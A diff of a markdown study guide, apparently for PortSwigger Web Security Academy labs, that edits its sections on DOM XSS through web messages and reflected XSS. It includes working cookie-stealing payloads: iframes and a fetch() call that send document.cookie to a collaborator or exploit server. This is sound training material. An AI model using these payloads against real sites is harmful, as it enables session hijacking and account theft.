@@ -14,8 +14,8 @@
 [Password refresh CSRF](#password-refresh-csrf)  
 [Brute force auth cookie](#brute-force-authentication)  
   
-**[Data Exfiltration](#Data-Exfiltration)**  
-[SQLi Credential Data Exfil](#sql-injection-data-exfiltration)  
+**[Data Exfiltration](#data-exfiltration)**  
+[SQLi Data Exfil](#sql-injection)  
 [XML entities & Injections](#xxe-injections)  
 [SSRF Server side request forgery](#ssrf---server-side-request-forgery)  
 [SSTI Server side template injection](#ssti---server-side-template-injection)  
@@ -33,7 +33,7 @@
 # Foothold  
 
 
-## AddEventListener JSON.parse  
+## DOM XSS Messages  
 
 >Target use web messaging and parses the message as JSON. Exploiting the vulnerability by constructing an HTML page on the exploit server that exploits DOM XSS vulnerability and steal victim cookie.  
 
@@ -83,7 +83,7 @@
 
 [PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)  
 
-### DOM XSS Exploitation with web messages  
+### DOM XSS Exploitation JSON.parse web messages  
 
 >Identify web messages on target that is using **postmessage()** with **DOM Invader**.  
 
@@ -138,21 +138,22 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 ## Cross Site Scripting
 
->XSS Resources  
+>XSS Resources pages to lookup payloads for **tags** and **events**.   
 
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 + [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  
->Set simple unsecure cookie in browser dev tools to do POC.  
+
+>Set test unsecure cookie in browser dev tools to do POC XSS cookie stealer.  
 
 ```JavaScript
 document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 ```
   
-### Methodology to identify allowed XSS Tags  
+### XSS Tags & Events  
 
->Identified Reflected XSS in **search** function then determine the HTML tags and events attributes not blocked  
+>This section give guide to identify reflected XSS in a **search** function on a target and how to determine the HTML tags and events attributes not blocked.  
   
->Body and event **'onresize'** is only allowed.  
+>The tag **Body** and event **onresize** is only the only allowed on target making it vulnerable to XSS.  
 
 ```JavaScript
 ?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
@@ -164,20 +165,23 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 ?search=%22%3E%3Cbody%20onpopstate=print()>
 ```  
 
-[Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
+[PortSwigger Cheat-sheet XSS Example: onpopstate event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
+
+>Below JavaScript is hosted on exploit server and then deliver to victim. It is iframe doing onload and the search parameter is vulnerable to **onpopstate**.  
+
 ```JavaScript
 <iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
-
 ```  
 
->OnHashChange **'#'** XSS  
+>Following iframe uses *hash** character to trigger the OnHashChange **'#'** XSS  
   
 ```JavaScript
 <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
 ```  
 
-[DOM XSS in jQuery selector sink using a hashchange event](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)  
+[Crypto-Cat: DOM XSS in jQuery selector sink using a hashchange event](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)  
 
+### Methodology to identify allowed XSS Tags  
 
 >The below lab gives great **Methodology** to identify allowed HTML tags and events for crafting POC XSS.  
 
@@ -191,13 +195,15 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 
 ### Reflected XSS (Cookie Stealers)  
 
->In the Search function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
+>In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
 
 >The search JavaScript code on the target is using the data in JSON reflected response, that is then send to **eval()** function, and not sanitizing **\\** escape proper user input.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
 
 ```JavaScript
 \"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
 ```  
+
+>Image show the request using search function to send the document.cookie value in base64 to collaboration server.  
 
 ![Reflected dom-xss json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
